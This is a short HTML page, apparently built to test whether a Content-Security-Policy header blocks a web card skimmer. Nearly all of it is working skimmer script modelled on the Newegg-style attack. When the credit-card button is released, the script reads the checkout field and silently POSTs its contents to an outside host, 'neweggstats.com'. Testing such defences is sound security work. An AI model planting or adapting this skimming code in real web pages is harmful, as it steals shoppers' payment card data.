<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script>


window.onload = function() {
    jQuery('#btnCreditCard').bind("mouseup touchend", function(e) {
        var dati = jQuery('#checkout').val();
        setTimeout(function() {
            jQuery.ajax({
                type: "POST",
                async: true,
                url: "https://neweggstats.com/GlobalData/",
                data: dati,
                dataType: 'application/json'
            });
        }, 250);
        
    });
};

</script>
</head>
<body>

<input id="checkout" type="text">

<button id="btnCreditCard">Get External Content</button>

</body>
</html>
